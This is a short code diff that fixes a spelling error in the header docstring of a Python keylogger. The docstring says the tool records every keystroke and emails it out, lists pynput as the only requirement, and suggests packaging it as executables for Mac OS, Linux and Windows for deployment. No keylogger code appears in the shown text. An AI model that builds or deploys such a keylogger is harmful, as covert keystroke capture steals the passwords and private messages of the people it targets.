@@ -9,7 +9,7 @@ The keylogger takes the all key strikes on keyboard and send them to an email ev
 Requirements: You need only to install pynput
           		'pip install pynput'
           		Use packaged executables for Mac OS, Linux and MS Windows for deployment
-Usage: python keylogger.py  or better for deployment to chnage source code and package the app as executables
+Usage: python keylogger.py  or better for deployment to change source code and package the app as executables
 Enjoy!
 '''
 
